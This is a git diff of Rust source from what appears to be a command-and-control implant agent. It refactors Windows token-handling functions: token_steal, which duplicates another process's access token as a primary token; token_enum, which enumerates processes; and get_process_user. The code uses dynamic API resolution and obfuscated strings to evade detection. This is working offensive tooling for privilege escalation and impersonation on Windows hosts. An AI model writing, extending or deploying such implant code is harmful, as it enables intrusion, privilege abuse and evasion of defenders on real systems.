@@ -5,11 +5,21 @@ use std::error::Error;
 use std::sync::Mutex;
 
 #[cfg(target_os = "windows")]
-use winapi::um::winnt::{
-    SecurityImpersonation, TokenPrimary, HANDLE, MAXIMUM_ALLOWED,
-    PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE,
-};
-
+type HANDLE = *mut std::ffi::c_void;
+#[cfg(target_os = "windows")]
+const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+#[cfg(target_os = "windows")]
+const TOKEN_DUPLICATE: u32 = 0x0002;
+#[cfg(target_os = "windows")]
+const TOKEN_QUERY: u32 = 0x0008;
+#[cfg(target_os = "windows")]
+const MAXIMUM_ALLOWED: u32 = 0x02000000;
+#[cfg(target_os = "windows")]
+const SecurityImpersonation: u32 = 2;
+#[cfg(target_os = "windows")]
+const TokenPrimary: u32 = 1;
+#[cfg(target_os = "windows")]
+const TokenUser: u32 = 1;
 #[cfg(target_os = "windows")]
 const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;
 #[cfg(target_os = "windows")]
@@ -98,7 +108,7 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
         }
 
         let mut token_handle: HANDLE = std::ptr::null_mut();
-        if open_process_token(process_handle, TOKEN_DUPLICATE, &mut token_handle) == 0 {
+        if open_process_token(process_handle, TOKEN_DUPLICATE, &mut token_handle as *mut _) == 0 {
             close_handle(process_handle);
             return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN), args.pid)));
         }
@@ -110,7 +120,7 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
             std::ptr::null_mut(),
             SecurityImpersonation,
             TokenPrimary,
-            &mut duplicated_token,
+            &mut duplicated_token as *mut _,
         );
 
         close_handle(token_handle);
@@ -296,7 +306,7 @@ pub fn token_enum(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
         PROCESSENTRY32W, TH32CS_SNAPPROCESS,
     };
-    use winapi::um::winnt::TOKEN_QUERY;
+    use winapi::um::handleapi::CloseHandle;
 
     unsafe {
         let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -340,15 +350,11 @@ pub fn token_enum(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
 
 #[cfg(target_os = "windows")]
 unsafe fn get_process_user(pid: u32) -> String {
-    use winapi::um::winnt::{TokenUser, TOKEN_USER, TOKEN_QUERY};
-
-    // Type definitions for dynamically resolved functions
     type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
     type OpenProcessTokenFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut *mut std::ffi::c_void) -> i32;
-    type GetTokenInformationFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut u8, u32, *mut u32) -> i32;
+    type GetTokenInformationFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;
     type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 
-    // Dynamically resolve APIs
     let open_process: OpenProcessFn = match crate::winapi_resolve::resolve("kernel32.dll", "OpenProcess") {
         Some(ptr) => std::mem::transmute(ptr),
         None => return "(resolve failed)".to_string(),
@@ -366,13 +372,13 @@ unsafe fn get_process_user(pid: u32) -> String {
         None => return "(resolve failed)".to_string(),
     };
 
-    let process = open_process(0x0400, 0, pid); // PROCESS_QUERY_LIMITED_INFORMATION
+    let process = open_process(0x0400, 0, pid);
     if process.is_null() {
         return "(access denied)".to_string();
     }
 
-    let mut token: HANDLE = std::ptr::null_mut();
-    if open_process_token(process, TOKEN_QUERY, &mut token) == 0 {
+    let mut token: *mut std::ffi::c_void = std::ptr::null_mut();
+    if open_process_token(process, TOKEN_QUERY, &mut token as *mut _) == 0 {
         close_handle(process);
         return "(no token)".to_string();
     }
@@ -385,10 +391,9 @@ unsafe fn get_process_user(pid: u32) -> String {
         return "(unknown)".to_string();
     }
 
-    let token_user = &*(buf.as_ptr() as *const TOKEN_USER);
-    let sid = token_user.User.Sid;
-
-    let username = sid_to_username(sid);
+    // TOKEN_USER structure: first field is SID_AND_ATTRIBUTES which starts with a pointer to SID
+    let sid_ptr = *(buf.as_ptr() as *const *mut std::ffi::c_void);
+    let username = sid_to_username(sid_ptr);
 
     close_handle(token);
     close_handle(process);
@@ -396,7 +401,7 @@ unsafe fn get_process_user(pid: u32) -> String {
 }
 
 #[cfg(target_os = "windows")]
-unsafe fn sid_to_username(sid: winapi::um::winnt::PSID) -> String {
+unsafe fn sid_to_username(sid: *mut std::ffi::c_void) -> String {
     use winapi::um::winbase::LookupAccountSidW;
 
     let mut name = vec![0u16; 256];
@@ -407,7 +412,7 @@ unsafe fn sid_to_username(sid: winapi::um::winnt::PSID) -> String {
 
     if LookupAccountSidW(
         std::ptr::null(),
-        sid,
+        sid as *mut _,
         name.as_mut_ptr(),
         &mut name_len,
         domain.as_mut_ptr(),
